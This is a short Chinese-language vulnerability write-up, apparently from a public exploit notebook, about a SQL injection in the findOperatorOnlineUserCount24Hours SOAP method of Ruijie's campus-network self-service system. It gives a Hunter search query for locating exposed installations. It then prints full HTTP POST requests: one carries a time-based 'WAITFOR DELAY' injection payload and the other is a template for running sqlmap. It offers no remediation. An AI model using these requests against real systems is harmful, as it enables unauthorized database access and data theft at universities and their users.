# 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞

# 一、漏洞简介
锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞。

# 二、影响版本
+ 锐捷网络股份有限公司校园网自助服务系统

# 三、资产测绘
+ hunter`app="校园网自助服务系统"`
+ 特征

![1698596756667-deb61ce2-460f-4df0-bfb5-037838f17027.png](./img/XdtS24xhzMy-H1dt/1698596756667-deb61ce2-460f-4df0-bfb5-037838f17027-944527.png)

# 四、漏洞复现
```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et';WAITFOR DELAY '0:0:5'--</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```

![1715606526425-645ee7d6-4644-4073-8d7f-4039afa5c77b.png](./img/XdtS24xhzMy-H1dt/1715606526425-645ee7d6-4644-4073-8d7f-4039afa5c77b-966318.png)

sqlmap

```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```

![1715606556821-efc3d9e8-e3b4-420d-b2fa-b0b98e12fd92.png](./img/XdtS24xhzMy-H1dt/1715606556821-efc3d9e8-e3b4-420d-b2fa-b0b98e12fd92-988323.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ih7fhkepsw3xw3bf>